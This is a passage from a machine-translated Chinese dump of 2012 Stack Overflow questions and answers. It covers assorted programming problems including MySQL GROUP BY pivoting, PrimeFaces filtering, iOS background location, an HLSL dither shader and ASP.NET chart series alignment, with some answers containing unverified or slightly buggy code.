四：http: [//blogs.msdn.com/dancre/archive/2006/02/16/implementing-a-virtualizingpanel-part-4-the-goods.aspx](http://blogs.msdn.com/dancre/archive/2006/02/16/implementing-a-virtualizingpanel-part-4-the-goods.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-06T07:03:28.997

如何尝试使用 Grid 并将项目添加到 Grid 中，例如：

（但我没有测试它的性能）

```
 public void InitializeGridAsFourColumns()
   {
        for (int i = 0; i < 4; i++)
        {
            _customGrid.ColumnDefinitions.Add(new ColumnDefinition());
        }

   }

    private static int row = -1;
    private static int column = 0;

   public void AddItem(item)
   {

        //Add new RowDefinition every 4 items
        if (column % 4 == 0)
        {
            RowDefinition rd = new RowDefinition();
            rd.Height = GridLength.Auto;
            _customGrid.RowDefinitions.Add(rd);
            row++;
        }

        item.SetValue(Grid.RowProperty, row);
        item.SetValue(Grid.ColumnProperty, column % 4);
        column++;
        _customGrid.Children.Add(item);

   } 
```

# python - Python 活塞模块的 HTTP 方法“补丁”

> ID：12839741
> 
> 赞同：0
> 
> 时间：2012-10-11T12:39:05.907
> 
> 标签：python, ajax, django, http, django-piston

通过我广泛的研究，我发现有一种 HTTP 方法变得流行，称为“Patch”（它在 Rails 4.0 中实现）。它有点像 PUT 方法，只是它用于属性更新而不是替换整个对象。我发现我在活塞中需要这种方法。有时我还需要替换对象，所以我不能只使用 PUT 来更新属性，我需要两者。我想看看我是否能找到使用 PATCH 的方法。有谁知道活塞是否支持这种方法，或者知道使活塞支持这种方法的方法。我在任何地方的文档中都找不到它。

我在 python 2.7 上使用带有 django 的活塞。

如果我的问题不够清楚，请告诉我。

谢谢

# jsf - 通过拖放过滤器在primefaces dataTable中不起作用

> ID：12839743
> 
> 赞同：0
> 
> 时间：2012-10-11T12:39:08.197
> 
> 标签：jsf, drag-and-drop, datatable, primefaces, filtering

拖放和排序对我来说工作正常，但过滤不能正常工作（过滤只能工作一次）。如果有人得到解决方案，请帮助我。

**索引.xhtml**

```
 <?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"     
      xmlns:p="http://primefaces.org/ui">
    <h:head>
        <script type="text/javascript">
           function handleDrop(event, ui)
           {
              var droppedCar = ui.draggable;
              droppedCar.fadeOut('fast');
           }
         </script>
    </h:head>
    <h:body>
        <h:form id="carForm">
                <p:dataTable id="availableCars" var="car" value="#{Report.field1}">

                    <p:column sortBy="#{car.values}" filterBy="#{car.values}" headerText="Properties"> 
                              <h:outputText id="dragIcon" value="#{car.values}" /> 
                              <p:draggable for="dragIcon" revert="true" /> 
                           </p:column> 
                 </p:dataTable>             
            <p:fieldset id="selectedCars" style="margin-top:20px"> 
                   <p:outputPanel id="dropArea"> 
                       <h:outputText value="!!!Drop here!!!" rendered="#{empty Report.field2}" style="font-size:24px;" /> 
                       <p:dataTable var="car" value="#{Report.field2}" rendered="#{not empty Report.field2}"> 
                               <p:column headerText="Color"> 
                                   <h:outputText value="#{car.values}" /> 
                               </p:column>                                         
                        </p:dataTable> 
                   </p:outputPanel> 
           </p:fieldset> 
           <p:droppable for="selectedCars" tolerance="touch" activeStyleClass="ui-state-highlight" datasource="availableCars" onDrop="handleDrop"> 
                  <p:ajax listener="#{Report.onCarDrop}" update="dropArea availableCars" /> 
            </p:droppable> 
        </h:form>
    </h:body>
</html> 
```

豆豆是

**临时报告.java**

```
 public class tempReport
{
    public String values;
    public tempReport(String values)
    {
        this.values=values;
    }
    public String getValues()
    {
        return values;
    }
    public void setValues(String values)
    {
        this.values=values;
    }   
} 
```

**报告生成器.java**

```
 import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.RequestScoped;
import org.primefaces.event.DragDropEvent;
@ManagedBean(name="Report")
@RequestScoped
public class ReportGenerator implements Serializable
{
    static List<tempReport> field1=new ArrayList<tempReport>(),field2=new ArrayList<tempReport>();
    static int i=1;
    public ReportGenerator()
    {

        if(i==1)
        {
        field1=new ArrayList<tempReport>();
        field2=new ArrayList<tempReport>();
        field1.add(new tempReport("one"));
        field1.add(new tempReport("two"));
        field1.add(new tempReport("three"));
        field1.add(new tempReport("four"));
        field1.add(new tempReport("five"));
        field1.add(new tempReport("six")); 
        i++;
        }
    }
    public List<tempReport> getField1()
    {
        return field1;
    }
    public void setField1(List<tempReport> field1)
    {
        this.field1=field1;
    }
     public List<tempReport> getField2()
    {
        return field2;
    }
    public void setField2(List<tempReport> field2)
    {
        this.field2=field2;
    }
    public void onCarDrop(DragDropEvent ddEvent)
     {
        tempReport car = ((tempReport) ddEvent.getData());
        int x=0;
        for(tempReport item: field2)
        {
            if(item==car)
                x=1;
        }
        if(x==0)
        field2.add(car);       
    } 
  } 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T14:28:46.450

我回到 primefaces 3.3.1，因为它在 3.3.1 中工作正常，在 3.4 和 3.4.1 中无法正常工作

谢谢

# node.js - 在节点中使用commander.js 进行命令行应用程序？

> ID：12839746
> 
> 赞同：0
> 
> 时间：2012-10-11T12:39:18.023
> 
> 标签：node.js, shell, command-line

我正在尝试使用 NPM 模块 command.js 构建命令行应用程序。

[指挥官.js](https://github.com/visionmedia/commander.js/)

使用 command.js，您可以像这样在终端上运行命令：

```
$ ./app --help 
```

但我想将其转换为：

```
$ app --help 
```

我怎样才能做到这一点，我将把它发布到 NPM 注册表中。它是自动发生的还是我必须改变一些东西。

注意：shell 脚本的文件名为`app`!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:17:23.390

运行文件为：

```
./app --help 
```

表示文件在当前目录中，所以你说运行当前目录中的应用程序文件。但如果你有“。” 这是 env variale: 中的当前目录`$PATH`，您无需提及`./app --help`，您可以简单地说`app --help`，因为 shell 知道在哪里可以找到该文件。

如果要在路径中添加当前目录，请执行以下操作：

```
export PATH=$PATH:. 
```

如果您需要更多信息和解释，[请查看此处](http://technonstop.com/dot-slash-meaning-linux)。

希望这可以澄清您的查询。

# mysql - 为什么当我使用 GROUP BY 时我的 MySQL 结果不正确？

> ID：12839750
> 
> 赞同：0
> 
> 时间：2012-10-11T12:39:49.223
> 
> 标签：mysql, sql

我有一个简单的表（ID、Member_ID、payment、date、payment_serial、running_total）；我需要 payment_serial 才能使用数据导出到另一个系统。

我需要的导出是会员支付的所有款项（显示付款和日期），按 payment_serial 的顺序排列在一行中。

这是我使用的第一个查询：

```
SELECT
  `Member_ID`,
  IF(`payment_serial`=1,`payment`,0) AS `p1`,
  IF(`payment_serial`=1,`date`,0) AS `p1_date`,
  IF(`payment_serial`=1,`ID`,0) AS `p1_ID`,
  IF(`payment_serial`=2,`payment`,0) AS `p2`,
  IF(`payment_serial`=2,`date`,0) AS `p2_date`
  IF(`payment_serial`=2,`ID`,0) AS `p2_ID`,
FROM monthlies
WHERE `Member_ID` = 4198739 
```

如果我使用这个查询，我会看到我需要的付款，但每个付款都在单独的一行中（这会在下一阶段产生很大的导入问题）：

```
Member_ID    p1     p1_date  p1_ID    p2    p2_date  p2_ID ...
  4198739   34.50    41143    214      0      0       0    ... 
  4198739     0        0       0     34.50  41176    583   ... 
```

我添加了 GROUP BY：

```
SELECT
  IF(`payment_serial`=1,`payment`,0) AS `p1`,
  IF(`payment_serial`=1,`date`,0) AS `p1_date`,
  IF(`payment_serial`=1,`ID`,0) AS `p1_ID`,
  IF(`payment_serial`=2,`payment`,0) AS `p2`,
  IF(`payment_serial`=2,`date`,0) AS `p2_date`,
  IF(`payment_serial`=2,`ID`,0) AS `p2_ID`
FROM monthlies
WHERE `Member_ID` = 4198739
GROUP BY `Member_ID` 
```

这为每个成员提供了一行 - 但**不是**每次付款：

```
Member_ID    p1     p1_date  p1_ID    p2    p2_date  p2_ID ...
  4198739   34.50    41143    214      0      0       0    ... 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:42:10.023

这不完全是你的错。MySQL 错误地实现了 GROUP BY。此时，任何其他 SQL 平台都会给您一个语法错误。

尝试

```
SELECT 
  MAX(IF(`payment_serial`=1,`payment`,0)) AS `p1`, 
  MAX(IF(`payment_serial`=1,`date`,0)) AS `p1_date`, 
  MAX(IF(`payment_serial`=1,`ID`,0)) AS `p1_ID`, 
  MAX(IF(`payment_serial`=2,`payment`,0)) AS `p2`, 
  MAX(IF(`payment_serial`=2,`date`,0)) AS `p2_date`, 
  MAX(IF(`payment_serial`=2,`ID`,0)) AS `p2_ID` 
FROM monthlies 
WHERE `Member_ID` = 4198739 
GROUP BY `Member_ID` 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:46:58.667

您期待来自 GROUP_BY 的错误输出。在 MySQL`GROUP_BY`中，它与诸如 etc 之类的命令结合使用，`MAX, AVG, SUM`以将所有结果放在一个合并的行中。

因此，如果您想导出数据，最好的方法是在不使用 group by 的情况下获取所有行，因为它将保留每一行及其唯一的成员 ID。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:42:20.817

GROUP BY 在 SELECT 的 IF 之前。

# iphone - 应用程序在后台时每 X 秒获取一次用户坐标

> ID：12839753
> 
> 赞同：2
> 
> 时间：2012-10-11T12:40:05.690
> 
> 标签：iphone, objective-c, ios, ios6, core-location

我想每 X 秒获取一次用户坐标。
我添加了进入应用程序委托的位置。

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
...
locationManager = [[CLLocationManager alloc] init];
    locationManager.delegate = self;
    locationManager.distanceFilter = kCLDistanceFilterNone;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;

    if([CLLocationManager locationServicesEnabled]){
        [self.locationManager startUpdatingLocation];
    }
... 
```

在这里我处理新坐标

```
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations
{
    CLLocation *loc = [locations objectAtIndex:0];

    NSDate* eventDate = loc.timestamp;
    NSTimeInterval howRecent = [eventDate timeIntervalSinceNow];
    if (howRecent < 10)
    {
        CLLocation* location = [locations lastObject];

        double lat = location.coordinate.latitude;
        double lng = location.coordinate.longitude;
        NSLog(@"lat:%f lng:%f", lat, lng);
... 
```

但我不知道当应用程序在后台时如何继续获取 iPhone 坐标。我想我应该添加一些代码：

```
- (void)applicationDidEnterBackground:(UIApplication *)application... 
```

但我不知道该怎么做才能让位置保持活力？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:52:25.483

在您的 info.plist 中：

R.Click -> 添加一行并选择`Required background modes`-> 并在项目 0 处选择`App registers for location updates`

# macos - 当我在 mac 终端中输入 $ gcc 时，我得到一个“-bash: gcc: command not found”

> ID：12839756
> 
> 赞同：0
> 
> 时间：2012-10-11T12:40:13.387
> 
> 标签：macos, gcc, command-line, terminal

但是，它在我输入时起作用：

```
$ gcc-4.2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:42:56.453

查找`gcc-4.2`安装位置并进入该目录：

```
$ cd $(which gcc-4.2) 
```

检查是否有 gcc 符号链接：

```
$ ls gcc 
```

如果没有，请创建它：

```
$ ln -s gcc-4.2 gcc 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-06T21:10:02.850

我明白了：在 Xcode > Preferences > Downloads 中安装**命令行工具后一切都很好。**

# ruby-on-rails - 使用在 Environment.rb 的 Initializer 中声明的常量

> ID：12839757
> 
> 赞同：0
> 
> 时间：2012-10-11T12:40:18.567
> 
> 标签：ruby-on-rails, constants

基本上我想要做的是将我的电子邮件用户名和密码保存在我的 environment.rb 的单独文件中。我已经在其他地方使用了初始化程序来执行此操作 - 但这里似乎首先加载了环境：

**发展.rb**

```
config.action_mailer.smtp_settings = {
    :address => "smtp.example.com",
    :port => 587,
    :domain => "www.example.com",
    :authentication => "plain",
    :user_name => SMTP_USERNAME,
    :password => SMTP_PASSWORD,
    :enable_starttls_auto => true
 } 
```

当我启动我的 Rails 服务器时，我收到一个错误：

```
uncaught exception: uninitialized constant SMTP_USERNAME 
```

由于初始化程序中的常量是在环境之后声明的，这是否是一个范围界定问题，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:44:53.673

如果您尝试在`application.rb`, inside中定义常量会`class Application < Rails::Application`怎样？然后，您可以通过执行类似的操作来访问常量`Application::SMTP_USERNAME`。这只是一个猜测。

# graphics - 为什么这个 128Bit 颜色格式被转换为 32Bit

> ID：12839758
> 
> 赞同：1
> 
> 时间：2012-10-11T12:40:20.033
> 
> 标签：graphics, colors, directx, hlsl, slimdx

我正在尝试为我正在从事的项目编写 HLSL 像素着色器。基本上我想做的是，如果纹理有一个浮点值为 0.52 的像素（在 0-255 的比例上是 132.6），我想在 60% 的时间输出 133，在 40% 的时间输出 132。现在写我只是想输出 RGB 值的小数余数（即提高像素的机会）但是我总是得到一个零值）我认为这是因为颜色被量化到 0-255 比例在他们到达着色器之前，但我不知道为什么会这样，因为我使用的是 A32B32G32R32f 格式，它应该能够存储大量有关颜色的信息。这是我非常简单的着色器代码。如果这很重要，我正在使用 SlimDX (DX9)。

```
sampler2D Tex0 : register(s0);
float4 DitherByChance(float2 coords : TEXCOORD0) : COLOR
{
    float4 newColor = float4(0, 0, 0, 0);   // The pixel color to return
    double4 oldColor = tex2D(Tex0, coords);
    double scale = 0.0039215686274509803921568627451;  // 1 / 255

    double rPercentChance = frac(oldColor.r / scale);   //Chance to round red channel up
    double gPercentChance = frac(oldColor.g / scale);   //Chance to round green channel up
    double bPercentChance = frac(oldColor.b / scale);   //Chance to round blue channel up

    newColor.r = rPercentChance;
    newColor.g = gPercentChance;
    newColor.b = bPercentChance;

    newColor.a = 1;

    return newColor;
}

technique DitherViaChance  
{  
    pass Pass1  
    {  
        PixelShader = compile ps_2_0 DitherByChance();      
    }  
} 
```

如果重要的话，这是我的 slimDX 代码：

```
Public Class TextStimulusDisplay
    Inherits BaseStimulusDisplay

    Protected ditherByChanceEffect As PixelShader
    Protected psByteCode As ShaderBytecode
    Protected gStream As DataStream
    Protected ditherBC As Effect

    Protected tex As Texture
    Protected spriteRender As Sprite

    Public displaySettings As DisplaySettings
    Public charText As Texture
    Public randomText As Texture

    Protected rando As Random

    Public Sub New(ByVal displaysettings As DisplaySettings, Optional ByVal WindowedMode As Boolean = False)
        MyBase.New(New Size(displaysettings.xResolution, displaysettings.yResolution), WindowedMode)
        Me.displaySettings = displaysettings
    End Sub

    Public Overrides Sub CreateDeviceResources()
        MyBase.CreateDeviceResources()
        ditherBC = Effect.FromFile(device, Application.StartupPath & "\effects\DitherByChance.fx", ShaderFlags.Debug)
        rando = New Random()

        randomText = New Texture(device, 100, 100, 1, Usage.Dynamic, Format.A32B32G32R32F, Pool.Default)
        Dim data(80000) As Byte
        rando.NextBytes(data)
        Dim dataBox As DataRectangle = randomText.GetSurfaceLevel(0).LockRectangle(LockFlags.None)
        dataBox.Data.Seek(0, IO.SeekOrigin.Begin)
        dataBox.Data.Write(data, 0, data.Length)
        dataBox.Data.Close()
        randomText.GetSurfaceLevel(0).UnlockRectangle()

        device.SetTexture(1, randomText)

        'psByteCode = ShaderBytecode.CompileFromFile(Application.StartupPath & "\effects\DitherByChance.fx", "DitherByChance", "ps_2_0", ShaderFlags.None)
        'ditherByChanceEffect = New PixelShader(device, psByteCode)
        'device.PixelShader = ditherByChanceEffect
        spriteRender = New Sprite(device)
        spriteRender.Transform = Matrix.Identity
        tex = createCharacterTexture()

    End Sub

    Public Overrides Sub ReleaseDeviceResources()
        MyBase.ReleaseDeviceResources()
    End Sub

    Public Overrides Sub RenderScene()
        'ditherBC.Technique = ditherBC.GetTechnique("DitherViaChance")

        Me.device.BeginScene()
        spriteRender.Begin(SpriteFlags.None)
        ditherBC.Begin()
        ditherBC.BeginPass(0)
        spriteRender.Draw(tex, New Rectangle(0, 0, 50, 50), New Color4(1, 1, 1))
        'spriteRender.Draw(randomText, New Rectangle(0, 0, 1000, 1000), New Color4(1, 1, 1))
        spriteRender.End()
        ditherBC.EndPass()
        ditherBC.End()
        Me.device.EndScene()
    End Sub

    Public Function createCharacterTexture() As Texture
        Dim RtsHelper As RenderToSurface = New RenderToSurface(device, 100, 100, Format.A32B32G32R32F)
        Dim texture As Texture = New Texture(device, 100, 100, 1, Usage.RenderTarget, Format.A32B32G32R32F, Pool.Default)

        Dim sloanFont As Font = New Font(device, 98, 98, FontWeight.Normal, 1, False, CharacterSet.Default, Precision.Default,
                                         FontQuality.ClearTypeNatural, PitchAndFamily.Default, "Sloan")

        RtsHelper.BeginScene(texture.GetSurfaceLevel(0), New Viewport(0, 0, 100, 100))

        sloanFont.DrawString(Nothing, "A", 1, 1, New SlimDX.Color4())
        RtsHelper.EndScene(Filter.None)

        Font.Dispose()
        RtsHelper.Dispose()

        Return texture
    End Function
End Class 
```

# javascript - 文本字段与 mobiscroll 一起错误显示

> ID：12839760
> 
> 赞同：0
> 
> 时间：2012-10-11T12:40:28.010
> 
> 标签：javascript, html, css, mobiscroll

我正在尝试为登录页面设置一个 mobiscroll 数字选择器，但似乎我做错了，因为在滚动上方，我得到一个文本字段，其中写有 mobiscroll 中选择的数字。

老实说，在网站上我没有找到一个非常容易理解的安装常见问题解答，而且我对这种事情有点陌生，请有人帮助我吗？在页面和代码的屏幕下方。

![在此处输入图像描述](../Images/2deca72cb539abd4322ea5e72a79f81a.png)

[这里的代码](https://mobiscroll.googlegroups.com/attach/e8bc48a6ee3a92c5/mobiscroll_number_select.rar?gda=uM2Dy0cAAAD-XxA0Ng2wKbdsf0VkTXmr6QVK_bXlH66btbQ50mJ38BCxNgLvxLagzxoJSt5nJeobQwFxJw55cVwemAxM-EWmeV4duv6pDMGhhhZdjQlNAw&gsc=hGpCNwoAAABHneRcm_9zoPuM39F6fyHo&pli=1&part=4)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:45:35.907

`input{display:none}`在css文件中添加。有用。

我假设您不希望显示文本框。

* * *

*js 文件中的以下行是在选择列表之前插入一个输入框。*

```
var input = $('<input type="text" id="' + id + '" value="' + main['_' + elm.val()] + '" class="' + s.inputClass + '" readonly />').insertBefore(elm); 
```

# java - soapui - 警告 - 未检测到文档的语法约束（DTD 或 XML 模式）

> ID：12839762
> 
> 赞同：2
> 
> 时间：2012-10-11T12:40:32.357
> 
> 标签：java, xml, eclipse, xsd, soapui

在我的 soapui xml 中，以下是前 2 行（为易读添加了空格）。

```
<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project name="Project_sample" 
  resourceRoot="${projectDir}" 
  soapui-version="3.6.1" 
  abortOnError="false" 
  runType="SEQUENTIAL" 
  defaultScriptLanguage="Groovy" 
  xmlns:con="http://eviware.com/soapui/config">
  <con:settings>
    <con:setting id = "com.eviware.soapui.impl.wsdl.actions.iface.tools.soapui.TestRunnerAction@values-local" 
  ><![CDATA[<xml-fragment
     xmlns:con="http://eviware.com/soapui/config">  
......................  
....................... goes on 
```

我已经检查了以下网址

[未检测到文档的语法约束（DTD 或 XML 模式）](https://stackoverflow.com/questions/4551783/no-grammar-constraints-dtd-or-xml-schema-detected-for-the-document)

[未检测到文档的语法约束（DTD 或 XML 模式）](https://stackoverflow.com/questions/8203898/no-grammar-constraints-dtd-or-xml-schema-detected-for-the-document)

[web.xml 的虚假 Eclipse 警告：“未检测到文档的语法约束（DTD 或 XML 模式）。”](https://stackoverflow.com/questions/322155/bogus-eclipse-warning-for-web-xml-no-grammar-constraints-dtd-or-xml-schema-d)

[在 taglib 文件中未检测到文档的语法约束（DTD 或 XML 模式）](https://stackoverflow.com/questions/12742753/no-grammar-constraints-dtd-or-xml-schema-detected-for-the-document-in-a-taglib)

[如何修复 Eclipse 验证错误“未检测到文档的语法约束”？](https://stackoverflow.com/questions/4833057/how-to-fix-eclipse-validation-error-no-grammar-constraints-detected-for-the-doc)

* * *

但是我不喜欢在Eclipse中修改配置（比如Windows->pref->xml->validation->Grammar->Ignore

我想编辑 xml 配置 - 可能在上面的 2 行中。是否可以删除此警告？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T18:10:31.140

经过一番谷歌搜索，这些soapui 配置文件似乎没有架构文件。

我知道您只是想摆脱 Eclipse 警告，但不修改任何 Eclipse 设置。好吧，这是一个黑客：

将您的 XML 标头更改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapui-project>
<con:soapui-project name="Project_sample" resourceRoot="${projectDir}" ...> 
```

这个“微文档类型”不做任何验证，但阻止 Eclipse 说没有模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-11T11:21:20.680

实际上有一个 XSD 文件，我在这里找到： [https ://community.smartbear.com/t5/SoapUI-Pro/parsing-soapui-project-file/td-p/1492](https://community.smartbear.com/t5/SoapUI-Pro/parsing-soapui-project-file/td-p/1492)

然而，这是从 2008 年开始的，并且是一个非常旧的 SoapUI 版本。当前版本的文件与此不匹配。

但是，它表明 a) 有一个 XSD，b) 公司（目前是 SmartBear）愿意放弃它。所以你可以问问他们的支持。

此外，您可能需要查看 SoapUI 应用程序文件。它可能包含此 XSD。

# javascript - html表单选择标签

> ID：12839763
> 
> 赞同：0
> 
> 时间：2012-10-11T12:40:34.180
> 
> 标签：javascript, jquery, html, forms

这有点烦人，但即使我使用过 html/css 和一点点 jquery，我还没有学到太多关于表单等的知识。

我有一个问题，我不能用谷歌搜索答案，但我相信你们中的一些铁杆开发者可以这么快地告诉我！？

我需要制作一个看起来像这样的表格：

**HTML** ;

```
<form class="slct-form">
    <select>
        <option value="choose">Choose</option>
        <option value="100.000">100.000</option>
        <option value="150.000">150.000</option>
        <option value="200.000">200.000</option>
    </select>
</form> 
```

我需要当我在下拉表单中选择一个元素时，它应该转到另一个 url...这不可能吗？最好没有 jquery ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:44:25.700

如果你添加一个`id`到你的`select`，你可以通过普通的 javascript 访问它，如下所示：

```
var selectmenu = document.getElementById("selectMenu");
selectmenu.onchange = function() {
    var selectedOption = this.options[this.selectedIndex];
    if (selectedOption.value != "choose")
        window.location.assign = "/page.php?selectvalue=" + selectedOption.value;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:52:30.193

你可以这样做：

```
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <title>Test</title>
        <script type="text/javascript">
        function donav(dd)
        {
            var navUrl = "";
            switch(dd.selectedIndex)
            {
                case 1:
                    navUrl = "http://www.google.com/";
                    break;
                case 2:
                    navUrl = "http://www.bing.com";
                    break;
         }
         document.location.href = navUrl;
        }
        </script>
    </head>
    <body>
<form class="slct-form">
    <select onchange="donav(this)">
        <option value="choose">Choose</option>
        <option value="100.000">100.000</option>
        <option value="150.000">150.000</option>
        <option value="200.000">200.000</option>
    </select>
</form>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:43:54.997

如果我正确地理解您，您想将价值从一页带到另一页吗？您可以将 $_GET['name'] 与 php 一起使用。

# html - 本地相对路径

> ID：12839765
> 
> 赞同：0
> 
> 时间：2012-10-11T12:40:43.437
> 
> 标签：html, css, relative-path

我在一个本地项目（离线）中工作，需要在 html 目录之外显示一个 txt 文件。如何实现相对路径？

```
main-app
|
|-core-app
|
|-logs
|   |-log-file.txt
|
|-plugin
    |-plugin-core
    |-www
       |-index.html 
```

该文件位于**日志**文件夹中，我需要在 index.html 中显示它。我尝试使用***src="../../../logs/log-file.txt"***但不起作用。html中的代码示例：

```
<object type="text/plain" data="../../../logs/log-file.txt"></object> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:44:42.087

相对于 index.html，我认为它应该是：data="../../logs/log-file.txt"。少一个目录移位。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-10-11T12:46:20.873

只需将 .txt 文件更改为 .html 文件，然后添加样式...就可以了，只需在 index.html 中添加指向它的链接即可。

# c# - Asp.net图表多系列显示错误数据

> ID：12839770
> 
> 赞同：0
> 
> 时间：2012-10-11T12:41:09.500
> 
> 标签：c#, asp.net, .net-4.0, charts

在以编程方式用asp.net多系列图表解决[了这个问题后，我在另一个多系列图表中发现了另一个问题：](https://stackoverflow.com/questions/12808642/how-to-show-asp-net-chart-grouped-by-2-parameters)

我想展示一份月度销售报告，显示最近`m`几个月在批准和拒绝提案中的演变。有几个月，没有任何被拒绝的提案，因此以下查询 (C#/Oracle) 返回一些空结果。

```
select to_char(c.date,'YYYYMM') ctb_month, 
       c.approved,
       count(distinct c.f1) amt_c, 
       count(b.f1) amt_b, 
       sum(nvl(b.value,0)) sum_values
from bens b 
     join contracts c
     on b.contract_id = c.f1
where b.seller = :USR_ID 
AND c.date 
     BETWEEN add_months(:DATAI,:MONTHS) AND :DATAI
group by to_char(c.date,'YYYYMM'), c.approved
order by ctb_month 
```

OBS：在绑定`:MONTHS`参数之前，我确保它的值是负数。

查询结果示例：

```
CTB_MONTH APPROVED AMT_C AMT_B SUM_VALUES

201209    APPROVED    10    20    1234.56
201209    PENDING      3     3     120.21
201210    APPROVED    12    18     850.52
201210    PENDING      4     4     158.71
201210    REJECTED     1     1      80.40 
```

注意：在这种情况下，当前卖家在 201209 中没有任何被拒绝的提案。

填充图表的代码：

我将较低层传递的数据存储在 var 中`report`，并按其状态过滤数据`APPROVED`：

```
var approved = queryResult
              .Where(r => r.APPROVED == "APPROVED")
              .ToList()
              ;
var rejected = queryResult
              .Where(r => r.APPROVED == "REJECTED")
              .ToList()
              ;
var pending =  queryResult
              .Where(r => r.APPROVED == "PENDING")
              .ToList()
              ; 
```

然后，我在循环中创建系列

```
for (int i = 0; i < 6; i++) {
    Series temp = new Series {
        XAxisType = AxisType.Primary,
        XValueType = ChartValueType.DateTime,
        YAxisType = AxisType.Primary,
        //mostra só a quantidade de contratos
        IsValueShownAsLabel = i % 2 == 0 ? true : false,
        ChartType = SeriesChartType.Column,
        CustomProperties = "EmptyPointValue=Zero",
        Legend = "Legenda"
    };
    grafico.Series.Add(temp);
} 
```

并手工对每个系列进行DataBinding

```
// approved contracts
grafico.Series[0].Points.DataBindXY(approved, "MONTH", approved, "AMT_C");
grafico.Series[0].LegendText = "Cont. approved";
// approved bens
grafico.Series[1].Points.DataBindXY(approved, "MONTH", approved, "AMT_B");
grafico.Series[1].LegendText = "Ben. approved";
grafico.Series[1].ChartType = SeriesChartType.Line;
// pending contracts
grafico.Series[2].Points.DataBindXY(pending, "MONTH", pending, "AMT_C");
grafico.Series[2].LegendText = "Cont. pending";
// pending bens
grafico.Series[3].Points.DataBindXY(pending, "MONTH", pending, "AMT_B");
grafico.Series[3].LegendText = "Ben. pending";
grafico.Series[3].ChartType = SeriesChartType.Line;
// rejected contracts
grafico.Series[4].Points.DataBindXY(rejected, "MONTH", rejected, "AMT_C");
grafico.Series[4].LegendText = "Cont. rejected";
// rejected bens
grafico.Series[5].Points.DataBindXY(rejected, "MONTH", rejected, "AMT_B");
grafico.Series[5].LegendText = "Ben. rejected";
grafico.Series[5].ChartType = SeriesChartType.Line; 
```

注意：`grafico`是我的图表对象；一些视觉设置在`<asp:Chart>`标签中定义。

当我运行应用程序时，完整的系列被正确绘制，但不完整的系列（201209 / REJECTED，在上面的例子中）被绘制在错误的`X`坐标中（201210 的值被绘制在 201209 的列中，在这种情况下） ，好像控件忽略了方法`X`中传递的值`DataBindXY`并按顺序绘制值。

有人知道如何解决这个问题吗？提前致谢。

**[已解决] 感谢@jbl，图表现在将值绘制在正确的位置。**

编码：

```
var allMonths = queryResult
    .Select(x => x.MONTH)
    .Distinct()
    .OrderBy(mes => mes)
    ;

foreach (var mes in allMonths) {

    bool hasData = rejected.Any(r => r.MONTH == mes);
    if (hasData == false) {
        rejected.Add(new MonthlyData() { MONTH = mes, APPROVED = "REJECTED" });
    }
    hasData = pending.Any(r => r.MONTH == mes);
    if (hasData == false) {
        pending.Add(new MonthlyData() { MONTH = mes, APPROVED = "PENDING" });
    }
    hasData = approved.Any(r => r.MONTH == mes);
    if (hasData == false) {
        approved.Add(new MonthlyData() { MONTH = mes, APPROVED = "APPROVED" });
    }
}
approved = approved.OrderBy(v => v.MONTH).ToList();
pending = pending.OrderBy(v => v.MONTH).ToList();
rejected = rejected.OrderBy(v => v.MONTH).ToList();

grafico.ChartAreas[0].AxisX.Interval = 1;
grafico.ChartAreas[0].AxisX.IntervalType = DateTimeIntervalType.Months;
grafico.ChartAreas[0].AxisX.IntervalOffset = 1;
grafico.ChartAreas[0].AxisX.IntervalOffsetType = DateTimeIntervalType.Months; 
```

*注意：* MonthlyData 是一个简单的类，用于传输查询结果中每一行的值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T15:15:09.593

我想你将不得不使用空数据点[http://msdn.microsoft.com/en-us/library/dd456677.aspx](http://msdn.microsoft.com/en-us/library/dd456677.aspx)来对齐你的所有系列

这意味着：

*   构建系列中所有 x 值的集合
*   将所有这些 x 值与您的系列进行左连接以检测所有缺失点
*   用空数据点填充缺失的点

希望这会有所帮助

编辑：您可以为已批准/AMT_C 系列尝试（未测试）类似的东西

```
var allXvalues = queryResult.select(r=>r.CTB_MONTH).Distinct().OrderBy(month=>month).ToList();

allXvalues
  .ForEach
   (
    xvalue=>
      {
        var p = approved.Where(o=>o.MONTH==xValue).FirstOrDefault();
        if(p==null)
            grafico.Series[0].Points.Add(new DataPoint(p.MONTH,p.AMT_C));
        else
